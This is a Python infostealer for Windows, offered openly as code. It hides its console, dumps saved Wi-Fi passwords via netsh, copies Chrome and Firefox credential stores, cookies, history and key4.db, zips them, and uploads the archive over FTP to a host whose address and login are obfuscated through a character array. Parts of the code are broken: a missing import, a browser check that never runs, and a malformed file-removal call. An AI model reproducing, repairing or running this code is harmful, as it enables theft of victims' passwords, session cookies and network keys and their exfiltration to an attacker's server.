import ftplib
import win32gui, win32con
import re
import subprocess
import os
import getpass
import glob

alpha = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','.','/','\\','*','|',' ','-','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']

#Hide Console.
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)

#Get current username
username = getpass.getuser()

#Browser exsistance var.
firefoxExsist = ""
g_chromeExsist = ""

#Looking for Browsers
def Get_InstalledBrowsers():
    p64 = "C:\\Program Files\\"
    p86 = "C:\\Program Files (x86)\\"
    s_p64 = glob.glob(p64 + "/**/*.exe", recursive = True)
    s_p64 = str(s_p64)
    s_p86 = glob.glob(p86 + "/**/*.exe", recursive = True)
    s_p86 = str(s_p86)
    if "firefox.exe" in s_p64 or s_p86:
        firefoxExsist = "1"
    else:
        firefoxExsist = "0"
    if "chrome.exe" in s_p64 or s_p86:
        g_chromeExsist = "1"
    else:
        g_chromeExsist = "0"



#Grabbing wifi passwords

def wifi_passwords():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
    wifi_list = []
    if len(profile_names) != 0:
        for name in profile_names:
            wifi_profile = {}
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
            if re.search("Security key           : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile)
                with open("wifi", "a") as f:
                    for x in range(len(wifi_list)):
                        print(wifi_list[x], file=f)

def copying_files():
    #Chrome files
    if g_chromeExsist == "1":
        os.system("powershell.exe Copy-Item 'C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' ." %username)
        os.system("powershell.exe Copy-Item 'C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' ." %username)
        os.system("powershell.exe Copy-Item 'C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Media History' ." %username)
        os.system("powershell.exe Copy-Item 'C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data' ." %username)
        os.system("powershell.exe Copy-Item 'C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History' ." %username)
        os.system("powershell.exe Copy-Item 'C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Affiliation Database' ." %username)
    #Firefox Files
    if firefoxExsist == "1":
        fire1 = 'C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\' %username
        fire2 = 'C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\' %username
        fire3 = 'C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\' %username
        fire4 = 'C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\' %username
        fire5 = 'C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\' %username
        fire1_glob = glob.glob(fire1 + "*.default-release-*\\storage.sqlite")
        fire2_glob = glob.glob(fire2 + "*.default-release-*\\logins.json")
        fire3_glob = glob.glob(fire3 + "*.default-release-*\\cookies.sqlite")
        fire4_glob = glob.glob(fire4 + "*.default-release-*\\places.sqlite")
        fire5_glob = glob.glob(fire5 + "*.default-release-*\\key4.db")
        shutil.copy(''.join(fire1_glob), '.')
        shutil.copy(''.join(fire2_glob), '.')
        shutil.copy(''.join(fire3_glob), '.')
        shutil.copy(''.join(fire4_glob), '.')
        shutil.copy(''.join(fire5_glob), '.')

    #Compressing chrome files
    os.system("powershell.exe Compress-Archive -LiteralPath 'Login Data', 'Cookies', 'Media History', 'Web Data', 'History', 'Affiliation Database', 'wifi', 'storage.sqlite', 'logins.json', 'cookies.sqlite', 'places.sqlite' -DestinationPath 'files.zip'")

def send_data():
    a = alpha[33]+alpha[17]+alpha[2]+alpha[7]+alpha[37]+alpha[13]+alpha[4]+alpha[12]+alpha[24]+alpha[59]+alpha[60]+alpha[61]
    b = alpha[59]+alpha[67]+alpha[60]+alpha[26]+alpha[59]+alpha[64]+alpha[66]+alpha[26]+alpha[59]+alpha[26]+alpha[67]
    c = alpha[21]+alpha[18]+alpha[5]+alpha[19]+alpha[15]
    FTP_HOST = b
    FTP_USER = c
    FTP_PASS = a
    ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
    ftp.encoding = "utf-8"

    Allfiles = "files.zip"
    with open(Allfiles, "rb") as f:
        ftp.storbinary(f"STOR {Allfiles}", f)
        ftp.quit()

def cleaning_up():
    os.remove("files.zip", "wifi", "Login Data", "Cookies", "Media History", "Web Data", "History", "Affiliation Database", "storage.sqlite", "logins.json", "cookies.sqlite", "places.sqlite")

wifi_passwords()
copying_files()
send_data()
